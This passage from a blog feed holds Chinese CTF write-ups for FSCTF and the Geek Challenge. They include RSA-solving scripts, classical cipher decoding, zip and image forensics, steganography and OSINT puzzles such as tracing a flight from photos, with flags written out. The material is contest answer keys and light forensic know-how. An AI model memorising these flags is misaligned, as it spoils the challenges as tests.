punctuation\">,</span>n<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2022</span><span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token operator\">*</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>h1<span class=\"token punctuation\">,</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>q <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span>kq<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">//</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>d <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>invmod<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ezmath\"><a class=\"markdownIt-Anchor\" href=\"#ezmath\">#</a> ezmath</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>s2n<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>hint <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2022</span> <span class=\"token operator\">*</span> p <span class=\"token operator\">+</span> <span class=\"token number\">2023</span><span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'n=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'c=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'hint=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>hint<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>n=16099847254382387482323197733210572595987701766995679577427964142162383113660616883997429365200200943640950821711084123429306946305893862414506257284441114840863787499898478803568113348661314216300658606282276936902117099898776435948501831796770856505782683585268617613575681655903107683069260253287994894440427511440504754827820494060133773435262418256886443037510658584541624614692050308222516337333585823733360631982795323752298740497235142977602602205292595197618229629610834651923388269194546316023246525302500676142502931303976146680655368617094100097945625676103639154884247373003120937959132698199043562660573</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>c=7980021929208497878634194663038470941705554065040985666635317762877799614984808729636911256912639929083920319066806111423231500122646366713245534616522235309310234767331344216892929739448126523171652425415458999098138841038319673380331281114806318366697490343176758140150118761408250366783210772381316729932361601257318131085116265135718477224618689710966570938280408341402386000281564650565256635313406111364916715660419153433573586809503564050585204002594864254089288672391014804368427324162776953191520483774116807593366091685560902424782104761523067998300887293902330501335485075609216897135678017158187880996872</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>hint=14005608544369156893681352040163362072608754453657200460825561123439158535855236943525558717120672888372079069187756549797113560863313618058077150885401191613229507892570378437310964624470055767463556516869604496669085622244233154871165554916349033197798790982409986216498996673603605465039336316170130644317728786516639634775709400754328137266154981484016505702738584209800158047120647468364899692021253904198509376650238372552486792709682170146695759196408908825447960637667502907929061819408441663880712891979320089482801220225451560809151067631824526463122992973388740015878474372614751149918455457191739542980396</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">16099847254382387482323197733210572595987701766995679577427964142162383113660616883997429365200200943640950821711084123429306946305893862414506257284441114840863787499898478803568113348661314216300658606282276936902117099898776435948501831796770856505782683585268617613575681655903107683069260253287994894440427511440504754827820494060133773435262418256886443037510658584541624614692050308222516337333585823733360631982795323752298740497235142977602602205292595197618229629610834651923388269194546316023246525302500676142502931303976146680655368617094100097945625676103639154884247373003120937959132698199043562660573</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">7980021929208497878634194663038470941705554065040985666635317762877799614984808729636911256912639929083920319066806111423231500122646366713245534616522235309310234767331344216892929739448126523171652425415458999098138841038319673380331281114806318366697490343176758140150118761408250366783210772381316729932361601257318131085116265135718477224618689710966570938280408341402386000281564650565256635313406111364916715660419153433573586809503564050585204002594864254089288672391014804368427324162776953191520483774116807593366091685560902424782104761523067998300887293902330501335485075609216897135678017158187880996872</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>h <span class=\"token operator\">=</span> <span class=\"token number\">14005608544369156893681352040163362072608754453657200460825561123439158535855236943525558717120672888372079069187756549797113560863313618058077150885401191613229507892570378437310964624470055767463556516869604496669085622244233154871165554916349033197798790982409986216498996673603605465039336316170130644317728786516639634775709400754328137266154981484016505702738584209800158047120647468364899692021253904198509376650238372552486792709682170146695759196408908825447960637667502907929061819408441663880712891979320089482801220225451560809151067631824526463122992973388740015878474372614751149918455457191739542980396</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2023</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>h<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"关键的vigenere\"><a class=\"markdownIt-Anchor\" href=\"#关键的vigenere\">#</a> 关键的 Vigenere</h3>\n<p py@nessfz_tzhozr!=\"\">题目：QGUMI</p>\n<p>key:\tFNY CQ HLQSEPNVJ<br>\n 提示：Keyword<br>\n（观其表，解其里）</p>\n<p>关键字解密：FNY CQ HLQSEPNVJ    key:Vigenere  &gt; KEY IS LOSTDREAM</p>\n<p yu@nsheng_qidong!=\"\">维吉尼亚解密：QGUMI {py@nessfz_tzhozr!}   key:LOSTDREAM  &gt; FSCTF</p>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> misc</h2>\n<h3 id=\"simple-encryption\"><a class=\"markdownIt-Anchor\" href=\"#simple-encryption\">#</a> Simple Encryption</h3>\n<p>压缩包伪加密。直接修改 deFlags 9 &gt; 0</p>\n<h3 id=\"萧河\"><a class=\"markdownIt-Anchor\" href=\"#萧河\">#</a> 萧河</h3>\n<p>修改 16 进制压缩包头 89 50 4E 47</p>\n<p>修改图片高度得到 flag</p>\n<h3 id=\"base套\"><a class=\"markdownIt-Anchor\" href=\"#base套\">#</a> base 套</h3>\n<p>base64 套好多次阿！！！</p>\n<h3 id=\"行不行啊细狗\"><a class=\"markdownIt-Anchor\" href=\"#行不行啊细狗\">#</a> 行不行啊细狗</h3>\n<p>修改 docx 文档，可能是系统问题吗？</p>\n<pre><code>FSCTF&#123;N0t_A_heRo_\n你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊\n\ndoEs_not_re@d_t\n</code></pre>\n<p>得到两串 flag</p>\n<p>将其修改压缩包后缀名</p>\n<blockquote>\n<p>document.xml</p>\n</blockquote>\n<blockquote>\n<p>He_3_Kinggggdoms}</p>\n</blockquote>\n<p>拼凑得到 flag</p>\n<h3 id=\"ez-osint\"><a class=\"markdownIt-Anchor\" href=\"#ez-osint\">#</a> ez-osint</h3>\n<p>百度搜图直接讲解，8：35-8：45</p>\n<h3 id=\"为什么不换换思路捏\"><a class=\"markdownIt-Anchor\" href=\"#为什么不换换思路捏\">#</a> 为什么不换换思路捏</h3>\n<pre><code>密文：3956305A7652305877676D656E3532626F395664776B3358723557596F52335835423055375A4556444E6C52\n</code></pre>\n<p><img data-src=\"/img/fsctfwppic/4.png\" alt=\"image-20231024083859306\"></p>\n<h3 id=\"最终试炼hhh\"><a class=\"markdownIt-Anchor\" href=\"#最终试炼hhh\">#</a> 最终试炼 hhh</h3>\n<p>压缩包文件逆序，写脚本修改一下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">reverse_hex</span><span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        hex_data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    reversed_hex <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>hex_data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span> i<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>hex_data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.zip'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span>reversed_hex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>reverse_hex<span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得到 1.zip</p>\n<p>里面有个 pdf 文档，利用工具 wbStego4.3open 无密码解密即可</p>\n<h3 id=\"夜深人静的时候也会偷偷emo\"><a class=\"markdownIt-Anchor\" href=\"#夜深人静的时候也会偷偷emo\">#</a> 夜深人静的时候也会偷偷 emo</h3>\n<p>压缩包密码：12345</p>\n<p CemMEnt_Se@1s_tHe_heaaaaaart_foR_An0ther_D@y=\"\">MP3Stego 隐写 ：FSCTF</p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/10/24/%E6%9E%81%E5%AE%A2wp/",
            "url": "http://example.com/2023/10/24/%E6%9E%81%E5%AE%A2wp/",
            "title": "极客wp",
            "date_published": "2023-10-24T01:31:05.000Z",
            "content_html": "<h1 id=\"极客大挑战wp\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战wp\">#</a> 极客大挑战 ———wp</h1>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"cheekin\"><a class=\"markdownIt-Anchor\" href=\"#cheekin\">#</a> cheekin</h3>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/1.png\" alt=\"image-20231029201202053\"></p>\n<h3 id=\"ez_smilemo\"><a class=\"markdownIt-Anchor\" href=\"#ez_smilemo\">#</a> ez_smilemo</h3>\n<p>上网自行搜索 data.win 怎么打开。</p>\n<p>找到工具 UndertaleModTool.exe</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/2.png\" alt=\"image-20231029201510600\"></p>\n<blockquote>\n<p>c20xbGVfMXNfQF9uMWNlX2dAbWU=</p>\n</blockquote>\n<p>解码 base64 得到 flag :&gt; sm1le_1s_@_n1ce_g@me</p>\n<h3 id=\"death_n0te\"><a class=\"markdownIt-Anchor\" href=\"#death_n0te\">#</a> DEATH_N0TE</h3>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/kamisama.png\" alt=\"kamisama\"></p>\n<p>题目如上！</p>\n<p>很明显能发现有像素点篡改。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>image <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'kamisama.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>convert<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>width<span class=\"token punctuation\">,</span> height <span class=\"token operator\">=</span> image<span class=\"token punctuation\">.</span>size</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>image_array <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>extracted_pixels <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        pixel <span class=\"token operator\">=</span> <span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>image_array<span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        extracted_pixels<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>pixel<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>width1 <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>height1 <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>img <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>width1<span class=\"token punctuation\">,</span> height1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>pixels <span class=\"token operator\">=</span> img<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>index <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>height1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>width1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        img<span class=\"token punctuation\">.</span>putpixel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> extracted_pixels<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>img<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">\"1.png\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>img<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/3.png\" alt=\"1\"></p>\n<p>哥特表的 base64</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/7.png\" alt=\"img\"></p>\n<p>进行对应：TkFNRV9oMnRha3VYWH0=</p>\n<p>解密： NAME_h2takuXX}</p>\n<p>第一段：</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/8.png\" alt=\"image-20231029203349480\"></p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/9.png\" alt=\"image-20231029203523790\"></p>\n<h3 id=\"下一站是哪儿呢\"><a class=\"markdownIt-Anchor\" href=\"#下一站是哪儿呢\">#</a> 下一站是哪儿呢</h3>\n<p>我和 yxx 去旅游，前一天还好好的，玩完《指挥官基恩》这个游戏就睡觉了，第二天晚上吃完饭她人就不见了，走之前留下了两张图片就消失了。你能帮我找找她坐哪个航班去哪个地方了嘛？  flag 格式：SYC {航班号_城市拼音}，城市拼音首字母大写噢</p>\n<p>附件给的挺全，说是社工，其实有图片隐写的地方</p>\n<p>1.jpg —&gt; 提取出压缩包内文件</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/10.png\" alt=\"image-20231029203951251\"></p>\n<p>secret.png 是银河表对应</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/secret.png\" alt=\"secret\"></p>\n<p>I wang to go liquor city 关键线索是白酒城  定位到四川泸州，机场是泸州白云</p>\n<p>结合聊天记录，知道 20.00 左右的飞机，出发点是深圳宝安国际机场</p>\n<p>使用软件搜索：定位航班 CZ8579  故 flag 为 CZ8579_Luzhou</p>\n<h3 id=\"qingwan心都要碎了\"><a class=\"markdownIt-Anchor\" href=\"#qingwan心都要碎了\">#</a> Qingwan 心都要碎了</h3>\n<p 地点名字=\"\">Qingwan 和 Yxx 一起去旅游，但是 Qingwan 睡的太死啦，Yxx 丢下她一个人去玩了，她一觉起来只看见 Yxx 发的朋友圈，能帮 Qingwan 找到她吗？ flag 格式：SYC</p>\n<p>百度搜图，定位重庆。搜索博物馆，第一个就是重庆中国三峡博物馆，得到 flag/</p>\n<p>SYC 重庆中国三峡博物馆}</p>\n<h3 id=\"xqr一血\"><a class=\"markdownIt-Anchor\" href=\"#xqr一血\">#</a> xqr（一血）</h3>\n<p>直接扫码，是假 flag。分析文件，里面还有张图片。进行提取。</p>\n<p>得到一个 25x25 的图片</p>\n<p>两张图片异或得到 flag.png 扫描二维码得到 flag。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span 